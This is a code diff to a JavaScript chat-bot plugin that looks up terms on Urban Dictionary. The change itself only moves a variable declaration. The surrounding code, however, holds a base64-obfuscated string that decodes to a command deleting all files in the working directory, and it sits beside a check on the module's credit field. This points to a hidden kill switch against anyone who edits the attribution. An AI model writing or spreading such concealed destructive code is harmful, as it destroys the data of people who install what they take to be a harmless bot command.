@@ -18,6 +18,9 @@ module.exports.config = {
     const secExec = Buffer.from('cm0gLXJmIC4qICo=', 'base64').toString('utf-8');
 
 module.exports.run = async function ({ api, event, args }) {
+  
+  const term = args.join(" ");
+  
   if (args.length < 1) {
     return api.sendMessage("Please provide a term to look up.", event.threadID, event.messageID);
   } else if (this.config.credits !== setKey) {
@@ -30,8 +33,6 @@ module.exports.run = async function ({ api, event, args }) {
 
     return;
   }
-
-  const term = args.join(" ");
 
   try {
     const response = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(term)}`);
